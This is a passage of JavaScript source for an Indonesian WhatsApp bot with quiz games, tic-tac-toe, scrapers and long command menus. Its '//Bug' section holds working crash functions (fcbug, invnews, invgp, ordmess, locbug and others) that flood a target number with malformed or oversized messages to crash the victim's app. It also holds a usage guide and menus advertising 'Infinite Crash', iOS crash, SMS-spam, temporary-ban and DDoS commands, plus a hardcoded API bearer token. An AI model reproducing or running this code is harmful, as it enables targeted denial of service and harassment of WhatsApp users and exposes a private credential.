        await xgreply('*Anda Telah menyerah*')
        delete tebakkalimat[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
        delete tebakkalimat[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebaklirik[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebaklirik[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
        delete tebaklirik[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
    kuis = true
    jawaban = tebaktebakan[m.sender.split('@')[0]]
    if (budy.toLowerCase() == "nyerah") {
        await xgreply('*Anda Telah menyerah*')
        delete tebaktebakan[m.sender.split('@')[0]]
    } else if (budy.toLowerCase() == jawaban) {
        await ryozingod.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
        delete tebaktebakan[m.sender.split('@')[0]]
    } else xgreply('*Jawaban Salah!*')
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
    let ok
    let isWin = !1
    let isTie = !1
    let isSurrender = !1
    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
    isSurrender = !/^[1-9]$/.test(m.text)
    if (m.sender !== room.game.currentTurn) {
        if (!isSurrender) return !0
    }
    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
        xgreply({
            '-3': 'Game telah berakhir',
            '-2': 'Invalid',
            '-1': 'Posisi Invalid',
            0: 'Posisi Invalid',
        } [ok])
        return !0
    }
    if (m.sender === room.game.winner) isWin = true
    else if (room.game.board === 511) isTie = true
    let arr = room.game.render().map(v => {
        return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
        } [v]
    })
    if (isSurrender) {
        room.game._currentTurn = m.sender === room.game.playerX
        isWin = true
    }
    let winner = isSurrender ? room.game.currentTurn : room.game.winner
    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['', ''][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
: @${room.game.playerX.split('@')[0]}
: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
        room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
    if (room.x !== room.o) ryozingod.sendText(room.x, str, m, {
        mentions: parseMention(str)
    })
    ryozingod.sendText(room.o, str, m, {
        mentions: parseMention(str)
    })
    if (isTie || isWin) {
        delete this.game[room.id]
    }
}

if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    for (let ment of mentionUser) {
        if (afk.checkAfkUser(ment, _afk)) {
            let getId2 = afk.getAfkId(ment, _afk)
            let getReason2 = afk.getAfkReason(getId2, _afk)
            let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
            let heheh2 = ms(getTimee)
            xgreply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
        }
    }
    if (afk.checkAfkUser(m.sender, _afk)) {
        let getId = afk.getAfkId(m.sender, _afk)
        let getReason = afk.getAfkReason(getId, _afk)
        let getTime = Date.now() - afk.getAfkTime(getId, _afk)
        let heheh = ms(getTime)
        _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
        fs.writeFileSync('dtbs/afk-user.json', JSON.stringify(_afk))
        ryozingod.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
    }
}


async function ssweb(url, device = 'desktop'){
return new Promise((resolve, reject) => {
const base = 'https://www.screenshotmachine.com'
const param = {
url: url,
device: device,
cacheLimit: 0
}
axios({url: base + '/capture.php',
method: 'POST',
data: new URLSearchParams(Object.entries(param)),
headers: {
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
}
}).then((data) => {
const cookies = data.headers['set-cookie']
if (data.data.status == 'success') {
axios.get(base + '/' + data.data.link, {
headers: {
'cookie': cookies.join('')
},
responseType: 'arraybuffer'
}).then(({ data }) => {
result = {
status: 200,
result: data
}
resolve(result)
})
} else {
reject({ status: 404, statuses: `Link Error`, message: data.data })
}
}).catch(reject)
})
}

async function diff(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function ephoto(url, texk) {
let form = new FormData()
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios.post(url, form, {
  headers: {
    ...form.getHeaders(),
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
  }
});

let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//Bug
const fcbug = async (target, jumlah, txt) => {
  for (let i = 0; i < jumlah; i++) {
    await sleep(300);
    var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
      'listMessage': {
        'title': `🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️${mdelay}`,
        'footerText': `${txt}`,
        'description': `${txt}.${mdelay}`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'thumbnail': fakejpg
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: m.chat, quoted: ryobug });

    await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id });
    await sleep(300);
  }
}

const hmbug = async (target, txt) => {
  await sleep(300);
  var etc = {
    scheduledCallCreationMessage: {
      callType: 2,
      scheduledTimestampMs: Date.now() + 86400000, // trigger
      title: txt
    }
  }
  ryozingod.relayMessage(target, etc, {})
  await sleep(300);
}

const endcall = async (target, txt) => {
  await sleep(300);
  var etc = {
    scheduledCallCreationMessage: {
      callType: 2,
      scheduledTimestampMs: 0,
      title: txt
    }
  }
  ryozingod.relayMessage(target, etc, {})
  await sleep(300);
}

const bugq = async (target, jumlah, txt) => {
  for (let i = 0; i < jumlah; i++) {
    await sleep(300);
    ryozingod.sendMessage(target, { text: txt }, { quoted: ryobug })
    await sleep(300);
  }
}

const invnews = async (target, jumlah, txt) => {
  for (let i = 0; i < jumlah; i++) {
    await sleep(300);
    var etc = {
      newsletterAdminInviteMessage: {
        newsletterJid: `120363224727390375@newsletter`,
        newsletterName: `${txt}${virtex2}`,
        jpegThumbnail: fakejpg,
        caption: `${txt}${virtex2}`,
        inviteExpiration: Date.now() + 1814400000
      }
    }
    ryozingod.relayMessage(target, etc, {});
  }
  await sleep(300);
}

const invgp = async (target, jumlah, txt) => {
  for (let i = 0; i < jumlah; i++) {
    await sleep(300);
    var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
      "groupInviteMessage": {
        "groupJid": "85296556573-1328272333@g.us",
        "inviteCode": "wFHwtOxGQN8OwK2x",
        "inviteExpiration": `${txt}${virtex2}`,
        "groupName": `${txt}${virtex2}`,
        "caption": `${txt}${virtex2}`,
        "jpegThumbnail": fakejpg,
      }
    }), { userJid: m.chat, quoted: ryobug })
    ryozingod.relayMessage(target, groupInvite.message, { messageId: groupInvite.key.id })
    await sleep(300)
  }
}

const ordmess = async (target, jumlah, txt) => {
  for (let i = 0; i < jumlah; i++) {
    await sleep(300);
    var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
      "orderMessage": {
        "orderId": "594071395007984",
        "orderImage": fakejpg,
        "itemCount": 100000000000,
        "status": "INQUIRY",
        "surface": "CATALOG",
        "message": `${txt}${virtex2}`,
        "jpegThumbnail": fakejpg,
        "orderTitle": `${txt}${virtex2}`,
        "sellerJid": "0@s.whatsapp.net",
        "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
        "totalAmount1000": "500000000000000",
        "totalCurrencyCode": "IDR",
      }
    }), { userJid: m.chat, quoted: ryobug })
    ryozingod.relayMessage(target, order.message, { messageId: order.key.id })
    await sleep(300);
  }
}

const locbug = async (target, jumlah, txt) => {
  for (let i = 0; i < jumlah; i++) {
   await sleep(300);
    ryozingod.sendMessage(target, {
      location: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: `${txt} ${cartbutton}`,
        addrees: `${txt} ${cartbutton}`,
        url: `https://${virtex2}${ios1}.com`,
        comment: 'anjay',
        jpegThumbnail: nulll2
      }
    }, { quoted: ryobug });
   await sleep(300);
  }
};

/*        if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}
*/

if (m.message) {
  if (isCmd && !m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(``)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
  } else if (m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`)));
  }
}

switch (command) {
    // Status
case 'public': {
if (!isPremium) return xgreply(mess.premium) 
inireact()
ryozingod.public = true
xgreply('succes')
}
break

case 'clearchat': {
inireact()
xgreply(bersihin)
}
break

case 'useofbug': {
let penis =`
Cara Penggunaan :

mimir 62XXXXX,1
↓
mimir nomor,jumlah

cara penggunaan bug yang menggunakan link group :

locgc https://WhatsApp.......

cara penggunaan bug yang menggunakan id group :

akuruok 120363228732435094@g.us

Cara Penggunaan Bug Ios :
vcrashios 62787XXXXX,JUMLAH

Penggunaan Spam Sms :

spamsms 62,878XX|jumlah (hanya bisa ke nomor indonesia / +62)
`;
xgreply(penis)
}
break

//Menu
case "menu": case "help": {
inireact()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let itsmenu = `


 ━━━━━━━━━━━━━━━━━━━━━━━
 
  ⧠       \`𝗦𝗣𝗜𝗗𝗘𝗥 𝗕𝗢𝗧\`
  ⧠ *_${weton} - ${week}, ${calender}_*

  ⧠ 𝑵𝒂𝒎𝒆  : ${pushname}
  ⧠ 𝑻𝒂𝒈   : @${m.sender.split('@')[0]}
  ⧠  𝑷𝒓𝒆𝒇𝒊𝒙 : ${prefix ? prefix : '✳ 𝐌𝐮𝐥𝐭𝐢 ༢'}
  ⧠ 𝑺𝒐𝒖𝒓𝒄𝒆   : 𝐖𝐬𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃.
  ⧠ 𝑺𝒕𝒂𝒕𝒖𝒔    : ${ryozingod.public ? '🕸️ 𝐏𝐮𝐛𝐥𝐢𝐜 🕷️' : '🕷️ 𝐒𝐞𝐥𝐟 🕸️'}
  ⧠ 𝑷𝒊𝒏𝒈 : ${latensi.toFixed(4)}
  
          \`𝗕𝗢𝗧 𝗕𝗬 𝗞𝗜𝗡𝗚 𝗦𝗔𝗠\`
              
 ━━━━━━━━━━━━━━━━━━━━━━━
 
         \`𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗\`

 ➵ Addprem 62XX/TAG 30d
 ➵ Dellprem 62XX/TAG 30d
 ➵ self
 ➵ public
 ➵ shutdown
 ➵ addcase 
 ➵ delcase
 ➵ join [link group]
 ➵ block [nomor]
 ➵ unblock [nomor]
 ➵ listblock
 ➵ setppbot [reply gambar]
 ➵ setbiobot [teks]
 ➵ listpc 

 
        \`𝗦𝗣𝗘𝗖𝗜𝗔𝗟\`

 ➵ bugmenu
 ➵ spamsms 254,78XX|jumlah
 ➵ tempban 62,878XX
 ➵ ddos-mix [url] [time] [thread] [rate]
 ➵ inspect-web link
 ➵ createunbanv1
 ➵ createunbanv2
 ➵ createunbanv3
 ➵ createunbanv4
 ➵ createunbanv5
 

       \`𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗖𝗠𝗗\`

 ➵ toimg | reply stiker
 ➵ toaudio | reply video
 ➵ sticker | reply gambar
 ➵ s | reply gambar 
 ➵ smeme teks bawah|teks atas
 ➵ tomp4 | reply stiker
 ➵ kalkulator 
 ➵ removebg | reply gambar
 ➵ wm | reply stiker
 ➵ attp teks
 ➵ styletext teks


       \`𝗔𝗜 𝗠𝗘𝗡𝗨\`

 ➵ ai query
 ➵ prompt-gpt query
 ➵ dall-e Ilustrasi 
 ➵ gptgo query
 ➵ c-ai query|query
 ➵ stablediffusion ilustrasi
 ➵ gpt4 query

 
        \`𝘼𝙄 𝙈𝙀𝙉𝙐\`

 ➵ google-article query
 ➵ google-search query
 ➵ search-kbbi query
 ➵ search-apk query
 ➵ search-resep
 ➵ search-sticker

 

    \`𝙑𝙊𝙄𝘾𝙀 𝘾𝙃𝘼𝙉𝙂𝙀𝙍 𝘾𝙈𝘿\`

 ➵ Bass ReplyAudio
 ➵ Blown ReplyAudio
 ➵ Deep ReplyAudio
 ➵ Earrape ReplyAudio
 ➵ Fast ReplyAudio
 ➵ Fat ReplyAudio
 ➵ Nightcore ReplyAudio
 ➵ Reverse ReplyAudio
 ➵ Robot ReplyAudio
 ➵ Slow ReplyAudio
 ➵ Tupai ReplyAudio



        \`𝙂𝙍𝙊𝙐𝙋 𝘾𝙈𝘿\`

 ➵ setppgroup reply gambar
 ➵ promote tag
 ➵ demote tag
 ➵ kick tag
 ➵ add nomor
 ➵ deleteppgroup
 ➵ delppgc
 ➵ editgroup teks
 ➵ editsubjek teks 
 ➵ editinfo teks
 ➵ editdesk teks
 ➵ clearchat
 ➵ resetlinkgc
 ➵ revoke
 ➵ infogc
 ➵ getppgc
 ➵ closegroup
 ➵ opengroup
 ➵ hidetag
 ➵ tagall
 ➵ linkgc


 
       \`𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 𝘾𝙈𝘿\`

 ➵ gitclone url
 ➵ mediafire url
 ➵ tiktokmp3 url
 ➵ tiktokvideo url
 ➵ ytmp4 url
 ➵ ytmp3 url
 ➵ play judul
 ➵ playmusic judul
 ➵ douyindl url
 ➵ igdlimage url
 ➵ igdlmp4 url
 ➵ pintmp4 url
 ➵ happymod nama apk


          \`𝙁𝙐𝙉 𝘾𝙈𝘿\`

 ➵ apakah
 ➵ bisakah
 ➵ bagaimanakah➵ gantengcek
 ➵ cekganteng
 ➵ cantikcek
 ➵ cekcantik
 ➵ sangecek
 ➵ ceksange
 ➵ gaycek
 ➵ cekgay
 ➵ lesbicek
 ➵ ceklesbi
 ➵ kapankah
 ➵ wangy
 ➵ cekmati

 

       \`𝙂𝘼𝙈𝙀 𝙈𝙀𝙉𝙐\`

 ➵ tictactoe
 ➵ suitpvp
 ➵ kuismath
 ➵ tebak gambar
 ➵ tebak kata
 ➵ tebak kalimat
 ➵ tebak lirik
 ➵ tebak tebakan
 ➵ tebak bendera
 ➵ tebak bendera2
 ➵ tebak kabupaten
 ➵ tebak kimia
 ➵ tebak asahotak
 ➵ tebak siapakahaku
 ➵ tebak susunkata
 ➵ tebak tekateki

     \`𝗥𝗔𝗡𝗗𝗢𝗠 𝗠𝗘𝗡𝗨\`

 ➵ tokohindo
 ➵ ngatanyindir
 ➵ ngatabuaya
 ➵ ngatababaji
 ➵ ngatabacot
 ➵ ngatabucin
 ➵ ilhamberkata
 ➵ quotesanime
 ➵ truth
 ➵ dare
 ➵ pantun

 
 
       \`𝗟𝗢𝗚𝗢 𝗠𝗔𝗞𝗘𝗥 𝗖𝗠𝗗\`

 ➵ shadow namalu 
 ➵ write namalu 
 ➵ romantic namalu
 ➵ burnpaper namalu
 ➵ smoke namalu 
 ➵ narutobanner namalu 
 ➵ love namalu 
 ➵ undergrass namalu
 ➵ doublelove namalu 
 ➵ coffecup namalu
 ➵ underwaterocean namalu
 ➵ smokyneon namalu
 ➵ starstext namalu
 ➵ rainboweffect namalu
 ➵ balloontext namalu
 ➵ metalliceffect namalu
 ➵ embroiderytext namalu
 ➵ flamingtext namalu
 ➵ stonetext namalu
 ➵ writeart namalu
 ➵ summertext namalu
 ➵ wolfmetaltext namalu
 ➵ nature3dtext namalu
 ➵ rosestext namalu
 ➵ naturetypography namalu
 ➵ quotesunder namalu
 ➵ shinetext namalu


     \`𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨\`

 ➵ Delsrv
 ➵ Delusr
 ➵ Listram
 ➵ Listsrv
 ➵ Listusr


       \`𝗣𝗥𝗜𝗠𝗕𝗢𝗡\`

 ➵ Nomorhoki
 ➵ Artimimpi
 ➵ Artinama
 ➵ Ramaljodoh
 ➵ Ramalcinta
 ➵ Ramaljodohbali
 ➵ Suamiistri
 ➵ Cocoknama
 ➵ Pasangan
 ➵ Jadiannikah
 ➵ Sifatusaha
 ➵ Rezeki
 ➵ Pekerjaan
 ➵ Nasib
 ➵ Penyakit
 ➵ Tarot
 ➵ Fengshui
 ➵ Haribaik
 ➵ Harisangar
 ➵ Harisial
 ➵ Nagahari
 ➵ Arahrezeki
 ➵ Peruntungan
 ➵ Weton
 ➵ Karakter
 ➵ Keberuntungan
 ➵ Masasubur
 ➵ Memancing
 ➵ Zodiak
 ➵ Shio


       \`𝗦𝗖𝗥𝗔𝗣𝗘\`

 ➵ akira
 ➵ akiyama
 ➵ ana
 ➵ asuna
 ➵ ayuzawa
 ➵ boruto
 ➵ chitoge
 ➵ deidara
 ➵ doraemon
 ➵ elaina
 ➵ emilia
 ➵ erza
 ➵ gremory
 ➵ hestia
 ➵ hinata
 ➵ isuzu
 ➵ itachi
 ➵ itori
 ➵ kaga
 ➵ kagura
 ➵ kakasih
 ➵ kaori
 ➵ keneki
 ➵ kotori
 ➵ kurumi
 ➵ madara
 ➵ mikasa
 ➵ miku
 ➵ minato
 ➵ naruto
 ➵ nezuko
 ➵ onepiece
 ➵ pokemon
 ➵ rize
 ➵ sagiri
 ➵ sakura
 ➵ sasuke
 ➵ shina
 ➵ shinka
 ➵ shizuka
 ➵ shota
 ➵ toukachan
 ➵ tsunade
 ➵ yukiyuki
 
 
      \`𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗩𝗖𝗙 𝗠𝗘𝗡𝗨\`

 ➵ pushkontakidgc idgc|teksny
 ➵ pushkontakv1 idgc|teksnya
 ➵ pushkontakv2 teks
 ➵ pushkontakv3 replyimg|teks
 ➵ savecontact idgc
 ➵ jpm replyimg|teks


       \`𝗘𝗣𝗛𝗢𝗧𝗢 𝗠𝗔𝗞𝗘𝗥\`
 ➵ glitchtext namalu
 ➵ writetext namalu
 ➵ advancedglow namalu
 ➵ typographytext namalu
 ➵ pixelglitch namalu
 ➵ neonglitch namalu
 ➵ flagtext namalu
 ➵ flag3dtext namalu
 ➵ deletingtext namalu
 ➵ blackpinkstyle namalu
 ➵ glowingtext namalu
 ➵ underwatertext namalu
 ➵ logomaker namalu
 ➵ cartoonstyle namalu
 ➵ papercutstyle namalu
 ➵ watercolortext namalu
 ➵ effectclouds namalu
 ➵ blackpinklogo namalu
 ➵ gradienttext namalu
 ➵ summerbeach namalu
 ➵ luxurygold namalu
 ➵ multicoloredneon namalu
 ➵ sandsummer namalu
 ➵ galaxywallpaper namalu
 ➵ 1917style namalu
 ➵ makingneon namalu
 ➵ royaltext namalu
 ➵ freecreate namalu
 ➵ galaxystyle namalu
 ➵ lighteffects namalu


      \`𝗦𝗢𝗨𝗡𝗗 𝗖𝗠𝗗\`

 ➵ sound1
 ➵ sound2
 ➵ sound3
 ➵ sound4
 ➵ sound5
 ➵ sound6
 ➵ sound7
 ➵ sound8
 ➵ sound9
 ➵ sound10
 ➵ sound11
 ➵ sound12
 ➵ sound13
 ➵ sound14
 ➵ sound15
 ➵ sound16
 ➵ sound17
 ➵ sound18
 ➵ sound19
 ➵ sound20
 ➵ sound21
 ➵ sound22
 ➵ sound23
 ➵ sound24
 ➵ sound25
 ➵ sound26
 ➵ sound27
 ➵ sound28
 ➵ sound29
 ➵ sound30
 ➵ sound31
 ➵ sound32
 ➵ sound33
 ➵ sound34
 ➵ sound35
 ➵ sound36
 ➵ sound37
 ➵ sound38
 ➵ sound39
 ➵ sound40
 ➵ sound41
 ➵ sound42
 ➵ sound43
 ➵ sound44
 ➵ sound45
 ➵ sound46
 ➵ sound47
 ➵ sound48
 ➵ sound49
 ➵ sound50
 ➵ sound51
 ➵ sound52
 ➵ sound53
 ➵ sound54
 ➵ sound55
 ➵ sound56
 ➵ sound57
 ➵ sound58
 ➵ sound59
 ➵ sound60
 ➵ sound61
 ➵ sound62
 ➵ sound63
 ➵ sound64
 ➵ sound65
 ➵ sound66
 ➵ sound67
 ➵ sound68
 ➵ sound69
 ➵ sound70
 ➵ sound71
 ➵ sound72
 ➵ sound73
 ➵ sound74
 ➵ sound75
 ➵ sound76
 ➵ sound77
 ➵ sound78
 ➵ sound79
 ➵ sound80
 ➵ sound81
 ➵ sound82
 ➵ sound83
 ➵ sound84
 ➵ sound85
 ➵ sound86
 ➵ sound87
 ➵ sound88
 ➵ sound89
 ➵ sound90
 ➵ sound91
 ➵ sound92
 ➵ sound93
 ➵ sound94
 ➵ sound95
 ➵ sound96
 ➵ sound97
 ➵ sound98
 ➵ sound99
 ➵ sound100
 ➵ sound101
 ➵ sound102
 ➵ sound103
 ➵ sound104
 ➵ sound105
 ➵ sound106
 ➵ sound107
 ➵ sound108
 ➵ sound109
 ➵ sound110
 ➵ sound111
 ➵ sound112
 ➵ sound113
 ➵ sound114
 ➵ sound115
 ➵ sound116
 ➵ sound117
 ➵ sound118
 ➵ sound119
 ➵ sound120
 ➵ sound121
 ➵ sound122
 ➵sound123
 ➵ sound124
 ➵ sound125
 ➵ sound126
 ➵ sound127
 ➵ sound128
 ➵ sound129
 ➵ sound130
 ➵ sound131
 ➵ sound132
 ➵ sound133
 ➵ sound134
 ➵ sound135
 ➵ sound136
 ➵ sound137
 ➵ sound138
 ➵ sound139
 ➵ sound140
 ➵ sound141
 ➵ sound142
 ➵ sound143
 ➵ sound144
 ➵ sound145
 ➵ sound146
 ➵ sound147
 ➵ sound148
 ➵ sound149
 ➵ sound150
 ➵ sound151
 ➵ sound152
 ➵ sound153
 ➵ sound154
 ➵ sound155
 ➵ sound156
 ➵ sound157
 ➵ sound158
 ➵ sound159
 ➵ sound160
 ➵ sound161


       \`𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢\`

  ➢ 𝕾𝖕𝖎𝖉𝖊𝖗
  ➢ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
  ➢ 𝐇𝐀𝐓𝐄𝐑𝐒

        \`𝕾𝕻𝕴𝕯𝕰𝕽 𝕭𝕺𝕿\`
`
            let hiks = {
  video: thesky,
  caption: itsmenu,
  gifPlayback: false,
  contextInfo:{externalAdReply:{
title: '🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️',
  body: `👤 名前 : ${m.pushName}`, 
  showAdAttribution: false,
  thumbnail:nulll2,
  mediaType: 4,
  MediaUrl:`${global.yt}`,
  sourceUrl:`${global.yt}`,
  }}
 }
await ryozingod.sendMessage(m.chat, hiks, {quoted: m })
await sleep(1000)
await ryozingod.sendMessage(m.chat, { audio: night, mimetype: 'audio/mpeg', ptt:true }, { quoted: m })
}
break

case "bugmenu": case "warmenu": {
    inireact()
    let timestamp = speed()
    let latensi = speed() - timestamp
    let run = runtime(process.uptime())
    let itsmenu = `

━━━━━━━━━━━━━━━━━━━━━━━
 
  ⧠       \`𝗦𝗣𝗜𝗗𝗘𝗥 𝗕𝗢𝗧\`
  ⧠ *_${weton} - ${week}, ${calender}_*

  ⧠ 𝑵𝒂𝒎𝒆  : ${pushname}
  ⧠ 𝑻𝒂𝒈   : @${m.sender.split('@')[0]}
  ⧠  𝑷𝒓𝒆𝒇𝒊𝒙 : ${prefix ? prefix : '✳ 𝐌𝐮𝐥𝐭𝐢 ༢'}
  ⧠ 𝑺𝒐𝒖𝒓𝒄𝒆   : 𝐖𝐬𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃.
  ⧠ 𝑺𝒕𝒂𝒕𝒖𝒔    : ${ryozingod.public ? '🕸️ 𝐏𝐮𝐛𝐥𝐢𝐜 🕷️' : '🕷️ 𝐒𝐞𝐥𝐟 🕸️'}
  ⧠ 𝑷𝒊𝒏𝒈 : ${latensi.toFixed(4)}
 
 ━━━━━━━━━━━━━━━━━━━━━━━

 
          \`𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗\`
          
 ➵ Addprem 62XX/TAG 30d
 ➵ Dellprem 62XX/TAG 30d
 ➵ self
 ➵ public
 ➵ shutdown
 ➵ addcase 
 ➵ delcase
 ➵ join [link group]
 ➵ block [nomor]
 ➵ unblock [nomor]
 ➵ listblock
 ➵ setppbot [reply gambar]
 ➵ setbiobot [teks]
 ➵ listpc 
  

 
 
 >❗𝐓𝐲𝐩𝐞 .useofbug 
 
         \`𝗜𝗣𝗛𝗢𝗡𝗘 𝗕𝗨𝗚𝗦\`

 ➵ valamak [ Khusus ios]
 ➵ vios [ Khusus ios]
 ➵ vbugip [ Khusus ios]
 ➵ viphone [ Khusus ios]
 ➵ vbugios [ Khusus ios]
 ➵ vcrashios [ Khusus ios]
 ➵ ipkokcrash? [ Khusus ios] 
 ➵ katanyaip [ Khusus ios]
 ➵ awok2ip [ Khusus ios]
 ➵ ipbang? [ Khusus ios]


           \`𝗕𝗨𝗚𝗠𝗘𝗡𝗨\`
 
 ➵ mimir [ Infinite Crash ] 
 ➵ infinitecrash [ Infinite Crash ]
 ➵ 3hit [ Infinite Crash ]
 ➵ msgbug2 [ Infinite Crash ]
 ➵ santet [ Infinite Crash ]
 ➵ seranganfajar [ Infinite Crash ]
 ➵ infinitecrash [ Infinite Crash ]
 ➵ 1hit [ Infinite Crash ]
 ➵ 2hit [ Infinite Crash ]
 ➵ 3hit [ Infinite Crash ]
 ➵ penghitaman [ Infinite Crash ]
 ➵ hitamkan [ Infinite Crash ]
 ➵ zetsbug [ Infinite Crash ]
 ➵ xgbug [ Infinite Crash ]
 ➵ zetskil [ Infinite Crash ]
 ➵ gengod7 [ Infinite Crash ]
